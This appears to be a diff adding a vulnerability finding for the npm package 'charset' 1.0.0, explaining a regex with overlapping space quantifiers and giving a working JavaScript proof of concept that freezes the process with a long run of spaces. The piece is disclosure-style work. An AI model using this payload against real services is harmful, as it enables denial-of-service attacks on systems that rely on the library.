@@ -1,0 +1,21 @@
+Confirmed: `charset` 1.0.0's regex `/(?:charset|encoding)\s*=\s*['"]? *([\w\-]+)/i` has overlapping adjacent quantifiers (`\s*` and a literal `" *"`, both matching spaces), causing quadratic backtracking blowup on a long run of spaces with no terminating word character — a ReDoS confirmed at ~19s for a 200KB input.
+
+```javascript
+// ReDoS in `charset` v1.0.0 (lib/charset.js)
+// Vulnerable regex: /(?:charset|encoding)\s*=\s*['"]? *([\w\-]+)/i
+// The adjacent quantifiers \s* and " *" both match the space character,
+// so a long run of spaces with no trailing word char forces catastrophic
+// (quadratic+) backtracking, freezing the event loop.
+
+const charset = require("./node_modules/charset");
+
+const padding = " ".repeat(200000); // attacker-controlled header/body value
+const malicious = "charset=" + padding + "!"; // no \w+ match at the end -> full backtrack
+
+console.log("Starting charset() on malicious input, this should hang for a long time...");
+const start = Date.now();
+
+charset(malicious);
+
+console.log("Finished in", Date.now() - start, "ms");
+```
